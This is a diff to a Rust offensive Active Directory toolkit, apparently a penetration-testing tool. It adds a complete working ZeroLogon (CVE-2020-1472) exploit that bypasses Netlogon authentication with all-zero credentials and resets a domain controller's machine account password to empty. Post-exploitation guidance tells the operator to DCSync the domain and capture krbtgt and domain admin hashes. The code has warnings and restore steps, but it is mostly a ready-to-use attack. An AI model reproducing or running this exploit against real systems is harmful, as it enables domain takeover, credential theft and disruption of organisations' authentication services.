@@ -12,11 +12,15 @@
 //! 2. `zerologon_probe` -- probabilistic probe: send an all-zero client
 //!    credential up to `max_attempts` times (1/256 success per attempt).
 //!
-//! Neither method modifies the machine account password. For the full
-//! exploitation (setting an empty password + DCSync) use an external tool.
+//! Neither method modifies the machine account password.
+//!
+//! The full exploit is also implemented here: [`zerologon_exploit`]
+//! performs the all-zero credential bypass (ServerSecureChannel, `$`-suffixed
+//! account name) and then resets the machine account password to empty via
+//! NetrServerPasswordSet2 (opnum 30). This is DESTRUCTIVE -- see its docs.
 //!
 //! Flow: SMB IPC$ -> `\pipe\netlogon` -> RPC Bind (MS-NRPC) ->
-//! NetrServerReqChallenge -> NetrServerAuthenticate3.
+//! NetrServerReqChallenge -> NetrServerAuthenticate3 [-> NetrServerPasswordSet2].
 
 use crate::error::{OverthroneError, Result};
 use crate::proto::epm::{
@@ -45,6 +49,13 @@ const OP_NETR_SERVER_REQ_CHALLENGE: u16 = 4;
 
 /// NetrServerAuthenticate3 -- authenticate the secure channel
 const OP_NETR_SERVER_AUTHENTICATE3: u16 = 26;
+
+/// NetrServerPasswordSet2 -- set the DC machine account password (opnum 30)
+const OP_NETR_SERVER_PASSWORD_SET2: u16 = 30;
+
+/// ServerSecureChannel (MS-NRPC NetlogonSecureChannelType) used by the DC
+/// machine account in the ZeroLogon exploit path.
+const SERVER_SECURE_CHANNEL: u32 = 6;
 
 /// Workstation secure channel type (MS-NRPC NetlogonSecureChannelType)
 const WORKSTATION_SECURE_CHANNEL: u32 = 2;
@@ -485,6 +496,395 @@ pub async fn zerologon_probe(
         status: last_status,
         account,
     })
+}
+
+// ===========================================================
+// ZeroLogon Full Exploit -- CVE-2020-1472 password reset
+// ===========================================================
+//
+// Wire reference: dirkjanm CVE-2020-1472 exploit + impacket
+// nrpc.py structures (verified against master):
+//
+// - NetrServerReqChallenge (opnum 4): PLOGONSRV_HANDLE (unique pointer to
+//   WSTR), ComputerName (WSTR value), ClientChallenge (8 raw bytes).
+// - NetrServerAuthenticate3 (opnum 26): PLOGONSRV_HANDLE, AccountName
+//   (WSTR value), SecureChannelType (enum 4 bytes), ComputerName (WSTR
+//   value), ClientCredential (8 raw bytes), NegotiateFlags (4).
+// - NetrServerPasswordSet2 (opnum 30): PLOGONSRV_HANDLE, AccountName
+//   (WSTR value), SecureChannelType, ComputerName (WSTR value),
+//   NETLOGON_AUTHENTICATOR (cred 8 + timestamp 4), ClearNewPassword
+//   (NL_TRUST_PASSWORD_FIXED_ARRAY: 4-byte count + 512-byte buffer = 516
+//   raw bytes).
+// - WSTR = max_count / offset / actual_count (chars incl terminator) +
+//   UTF-16LE data padded to 4 bytes.
+// - Unique pointer framing = ReferentID (non-zero) + WSTR bytes; a zero
+//   ReferentID means NULL.
+//
+// Attack flow (dirkjanm cve-2020-1472-exploit.py):
+// 1. NetrServerReqChallenge with an all-zero client challenge.
+// 2. NetrServerAuthenticate3 with account `DC$`, channel type
+//    ServerSecureChannel (6) and an all-zero client credential. Accepted
+//    with probability 1/256 per attempt (AES-CFB8 keystream leading byte).
+// 3. NetrServerPasswordSet2 with an all-zero authenticator and 516 zero
+//    bytes of ClearNewPassword -- resets the machine account password to
+//    empty. Retried on STATUS_ACCESS_DENIED.
+//
+// WARNING: step 3 is DESTRUCTIVE for the DC's normal operation: the
+// machine account password is reset to empty and the domain breaks until
+// the password is restored. See ZerologonExploitResult::restore_guidance.
+
+/// Result of the full ZeroLogon exploit (CVE-2020-1472 password reset).
+#[derive(Debug, Clone)]
+pub struct ZerologonExploitResult {
+    /// True when the auth bypass (all-zero credential) was accepted.
+    pub vulnerable: bool,
+    /// Netlogon authentication attempts used to reach the bypass
+    /// (expected average: 256).
+    pub attempts: u32,
+    /// True when NetrServerPasswordSet2 returned STATUS_SUCCESS (0).
+    pub password_reset: bool,
+    /// PasswordSet2 attempts used (expected average: 256).
+    pub reset_attempts: u32,
+    /// Machine account name used (no `$`).
+    pub account: String,
+    /// Operator warnings about the destructive nature + restore actions.
+    pub restore_guidance: Vec<String>,
+}
+
+/// Default maximum attempts for both exploit phases (mirrors the
+/// dirkjanm reference `MAX_ATTEMPTS = 2000`).
+pub const ZEROLOGON_MAX_ATTEMPTS_DEFAULT: u32 = 2000;
+
+/// Build the NetrServerReqChallenge stub with a unique-pointer PrimaryName
+/// and a WSTR ComputerName (ZeroLogon wire shape).
+fn build_zero_req_challenge_stub(
+    server_unc: &str,
+    computer: &str,
+    client_challenge: &[u8; 8],
+) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&1u32.to_le_bytes()); // ReferentID: non-null
+    stub.extend_from_slice(&ndr_conformant_string(server_unc));
+    stub.extend_from_slice(&ndr_conformant_string(computer));
+    stub.extend_from_slice(client_challenge);
+    stub
+}
+
+/// Build the NetrServerAuthenticate3 stub with unique-pointer PrimaryName,
+/// WSTR account/computer, explicit channel type and credentials.
+fn build_zero_authenticate3_stub(
+    server_unc: &str,
+    account: &str,
+    computer: &str,
+    client_credential: &[u8; 8],
+    negotiate_flags: u32,
+) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&1u32.to_le_bytes()); // ReferentID: non-null
+    stub.extend_from_slice(&ndr_conformant_string(server_unc));
+    stub.extend_from_slice(&ndr_conformant_string(account));
+    stub.extend_from_slice(&SERVER_SECURE_CHANNEL.to_le_bytes());
+    stub.extend_from_slice(&ndr_conformant_string(computer));
+    stub.extend_from_slice(client_credential);
+    stub.extend_from_slice(&negotiate_flags.to_le_bytes());
+    stub
+}
+
+/// Build the NetrServerPasswordSet2 stub (opnum 30, MS-NRPC 3.5.4.4.10).
+///
+/// `primary_name` is the LOGONSRV handle (`\\DCNAME`), `account` is the
+/// machine account (`DC$`), `computer` the bare name. `authenticator` is
+/// the 12-byte NETLOGON_AUTHENTICATOR (cred 8 + timestamp 4) and
+/// `clear_password` the 516-byte ClearNewPassword field (4-byte count +
+/// 512-byte buffer). All-zero values produce the exploit request.
+pub fn build_password_set2_stub(
+    primary_name: &str,
+    account: &str,
+    computer: &str,
+    authenticator: &[u8; 12],
+    clear_password: &[u8; 516],
+) -> Vec<u8> {
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&1u32.to_le_bytes()); // ReferentID: non-null
+    stub.extend_from_slice(&ndr_conformant_string(primary_name));
+    stub.extend_from_slice(&ndr_conformant_string(account));
+    stub.extend_from_slice(&SERVER_SECURE_CHANNEL.to_le_bytes());
+    stub.extend_from_slice(&ndr_conformant_string(computer));
+    stub.extend_from_slice(authenticator);
+    stub.extend_from_slice(clear_password);
+    stub
+}
+
+/// Extract the NTSTATUS from a NetrServerPasswordSet2 response.
+///
+/// Fault PDU: status at offset 24. Response PDU stub:
+/// ReturnAuthenticator(cred 8 + ts 4) + ErrorCode(4) -> status at 36.
+fn parse_password_set2_status(resp: &[u8]) -> Option<u32> {
+    if resp.len() < 28 {
+        return None;
+    }
+    if resp[2] == 3 {
+        return Some(u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]]));
+    }
+    if resp[2] == 2 && resp.len() >= 40 {
+        return Some(u32::from_le_bytes([resp[36], resp[37], resp[38], resp[39]]));
+    }
+    None
+}
+
+/// Full ZeroLogon exploit (CVE-2020-1472) -- resets the target DC's machine
+/// account password to the empty string over the Netlogon secure channel.
+///
+/// # DANGER
+/// **This is destructive.** After a successful run the DC's machine
+/// account password is empty; the domain's normal Netlogon secure channel
+/// breaks and the DC stops properly serving authentication until the
+/// password is restored. Only use on systems you are authorised to break,
+/// and immediately run DCSync (`ovt secretsdump`) to recover the domain
+/// hashes, then restore the machine password with the original hash.
+///
+/// # Arguments
+/// * `dc_ip` - Target DC IP/hostname.
+/// * `computer_name` - Target DC machine name (NetBIOS, no `$`). Empty
+///   derives from `dc_ip`.
+/// * `max_attempts` - Maximum authentication / password-set attempts
+///   (average 256 needed when vulnerable; use [`ZEROLOGON_MAX_ATTEMPTS_DEFAULT`]).
+pub async fn zerologon_exploit(
+    dc_ip: &str,
+    computer_name: &str,
+    max_attempts: u32,
+) -> Result<ZerologonExploitResult> {
+    const AUTH_FAILURE: u32 = 0xC000_006A;
+    const ACCESS_DENIED: u32 = 0xC000_0022;
+
+    let base = normalize_computer_name(computer_name);
+    let account = format!("{}$", base);
+    let server_unc = format!("\\\\{}", dc_ip.trim_start_matches('\\'));
+    info!(
+        "Zerologon: FULL EXPLOIT against {dc_ip} as machine account '{account}' \
+         (max {max_attempts} attempts per phase) -- destructive operation"
+    );
+
+    let smb = SmbSession::connect(dc_ip, "", "", "")
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: dc_ip.to_string(),
+            reason: format!("ZeroLogon exploit: SMB anonymous session failed: {e}"),
+        })?;
+    netlogon_bind(&smb).await?;
+
+    // Phase 1 -- authentication bypass with all-zero credentials.
+    let zero_challenge = [0u8; 8];
+    let zero_credential = [0u8; 8];
+    let mut auth_attempts = 0u32;
+    let mut bypassed = false;
+    for attempt in 1..=max_attempts.max(1) {
+        netlogon_req_challenge_raw(&smb, &server_unc, &account, &base, &zero_challenge).await?;
+        let status =
+            netlogon_authenticate3_raw(&smb, &server_unc, &account, &base, &zero_credential)
+                .await?;
+        auth_attempts = attempt;
+        match status {
+            Some(0) => {
+                bypassed = true;
+                info!("Zerologon: auth bypass accepted on attempt {attempt}");
+                break;
+            }
+            Some(st) if st == AUTH_FAILURE || st == ACCESS_DENIED => {}
+            Some(0xC000_000D) => {
+                return Err(OverthroneError::Rpc {
+                    target: dc_ip.to_string(),
+                    reason: format!(
+                        "ZeroLogon: STATUS_INVALID_PARAMETER -- is '{base}' the \
+                         correct NetBIOS machine name of the DC?"
+                    ),
+                });
+            }
+            Some(st) => {
+                return Err(OverthroneError::Rpc {
+                    target: dc_ip.to_string(),
+                    reason: format!(
+                        "ZeroLogon: unexpected Authenticate3 status 0x{st:08X} \
+                         on attempt {attempt} (target likely patched)"
+                    ),
+                });
+            }
+            None => {
+                warn!("Zerologon: unparseable Authenticate3 response on attempt {attempt}");
+            }
+        }
+    }
+
+    if !bypassed {
+        drop(smb);
+        warn!("Zerologon: no auth bypass after {auth_attempts} attempts -- not vulnerable");
+        return Ok(ZerologonExploitResult {
+            vulnerable: false,
+            attempts: auth_attempts,
+            password_reset: false,
+            reset_attempts: 0,
+            account: base,
+            restore_guidance: Vec::new(),
+        });
+    }
+
+    // Phase 2 -- NetrServerPasswordSet2 with an all-zero authenticator.
+    let zero_authenticator = [0u8; 12];
+    let zero_password = [0u8; 516];
+    let mut reset_attempts = 0u32;
+    let mut password_reset = false;
+    for attempt in 1..=max_attempts.max(1) {
+        let stub = build_password_set2_stub(
+            &server_unc,
+            &account,
+            &base,
+            &zero_authenticator,
+            &zero_password,
+        );
+        let pdu = build_rpc_request(OP_NETR_SERVER_PASSWORD_SET2, &stub);
+        let resp =
+            smb.pipe_transact(NETLOGON_PIPE, &pdu)
+                .await
+                .map_err(|e| OverthroneError::Rpc {
+                    target: dc_ip.to_string(),
+                    reason: format!("NetrServerPasswordSet2 failed: {e}"),
+                })?;
+        let status = parse_password_set2_status(&resp);
+        reset_attempts = attempt;
+        match status {
+            Some(0) => {
+                password_reset = true;
+                info!("Zerologon: machine account password reset to empty (attempt {attempt})");
+                break;
+            }
+            Some(st) if st == ACCESS_DENIED => {}
+            Some(0xC000_000D) => {
+                return Err(OverthroneError::Rpc {
+                    target: dc_ip.to_string(),
+                    reason: format!(
+                        "ZeroLogon: PasswordSet2 STATUS_INVALID_PARAMETER on \
+                         attempt {attempt} -- account name mismatch"
+                    ),
+                });
+            }
+            Some(st) => {
+                return Err(OverthroneError::Rpc {
+                    target: dc_ip.to_string(),
+                    reason: format!(
+                        "ZeroLogon: unexpected PasswordSet2 status 0x{st:08X} on \
+                         attempt {attempt}"
+                    ),
+                });
+            }
+            None => {
+                warn!("Zerologon: unparseable PasswordSet2 response on attempt {attempt}");
+            }
+        }
+    }
+    drop(smb);
+
+    let restore_guidance = ZerologonExploitResult::restore_guidance_text();
+    if password_reset {
+        warn!(
+            "Zerologon: DC machine password of '{base}' is now EMPTY. Domain \
+             secure channel is broken. Immediately: (1) DCSync via the empty \
+             password, (2) restore the original machine password."
+        );
+    } else {
+        warn!("Zerologon: bypass succeeded but PasswordSet2 did not confirm success");
+    }
+
+    Ok(ZerologonExploitResult {
+        vulnerable: true,
+        attempts: auth_attempts,
+        password_reset,
+        reset_attempts,
+        account: base,
+        restore_guidance,
+    })
+}
+
+/// NetrServerReqChallenge with the ZeroLogon (unique-pointer) wire shape.
+async fn netlogon_req_challenge_raw(
+    smb: &SmbSession,
+    server_unc: &str,
+    _account: &str,
+    computer: &str,
+    client_challenge: &[u8; 8],
+) -> Result<()> {
+    let stub = build_zero_req_challenge_stub(server_unc, computer, client_challenge);
+    let pdu = build_rpc_request(OP_NETR_SERVER_REQ_CHALLENGE, &stub);
+    let resp = smb
+        .pipe_transact(NETLOGON_PIPE, &pdu)
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: smb.target.clone(),
+            reason: format!("ZeroLogon NetrServerReqChallenge failed: {e}"),
+        })?;
+    if parse_server_challenge(&resp).is_none() {
+        return Err(OverthroneError::Rpc {
+            target: smb.target.clone(),
+            reason: format!(
+                "ZeroLogon: unexpected NetrServerReqChallenge response \
+                 (type={}, len={})",
+                resp.get(2).copied().unwrap_or(0),
+                resp.len()
+            ),
+        });
+    }
+    Ok(())
+}
+
+/// NetrServerAuthenticate3 with the ZeroLogon (unique-pointer) wire shape.
+/// Returns the server NTSTATUS.
+async fn netlogon_authenticate3_raw(
+    smb: &SmbSession,
+    server_unc: &str,
+    account: &str,
+    computer: &str,
+    client_credential: &[u8; 8],
+) -> Result<Option<u32>> {
+    let stub = build_zero_authenticate3_stub(
+        server_unc,
+        account,
+        computer,
+        client_credential,
+        NETLOGON_NEGOTIATE_FLAGS,
+    );
+    let pdu = build_rpc_request(OP_NETR_SERVER_AUTHENTICATE3, &stub);
+    let resp = smb
+        .pipe_transact(NETLOGON_PIPE, &pdu)
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: smb.target.clone(),
+            reason: format!("ZeroLogon NetrServerAuthenticate3 failed: {e}"),
+        })?;
+    let status = parse_authenticate3_status(&resp);
+    Ok(status)
+}
+
+impl ZerologonExploitResult {
+    /// Standard post-exploitation + restore guidance lines.
+    pub fn restore_guidance_text() -> Vec<String> {
+        vec![
+            "IMMEDIATE next steps (the DC machine password is now EMPTY):".to_string(),
+            "1. DCSync the domain NOW while the password is empty:".to_string(),
+            "   the empty password NT hash is 31d6cfe0d16ae931b73c59d7e0c089c0".to_string(),
+            "   (e.g. `ovt secretsdump -d <domain> -t <dc>` with the DC machine".to_string(),
+            "   account '<DC>$' authenticated via the empty password).".to_string(),
+            "2. Capture domain hashes (krbtgt, DA accounts) before killing access.".to_string(),
+            "3. RESTORE the machine account password (mandatory hygiene):".to_string(),
+            "   - Preferred: re-issue NetrServerPasswordSet2 with the ORIGINAL".to_string(),
+            "     machine account NT hash captured before the exploit (DCSync/".to_string(),
+            "     earlier secretsdump notes); this is the same opnum used here.".to_string(),
+            "   - Or run `Reset-ComputerMachinePassword` from an elevated shell on".to_string(),
+            "     a domain-joined host against the DC, or reboot the DC twice and".to_string(),
+            "     verify with `Test-ComputerSecureChannel -Verbose`.".to_string(),
+            "4. Windows Server 2019/2025 DCs with the August 2020 hardening".to_string(),
+            "   (RequireSignOrSeal in restricted mode) reject this exploit; if you".to_string(),
+            "   see repeated C0000022/C000006A the target is likely patched.".to_string(),
+        ]
+    }
 }
 
 #[cfg(test)]
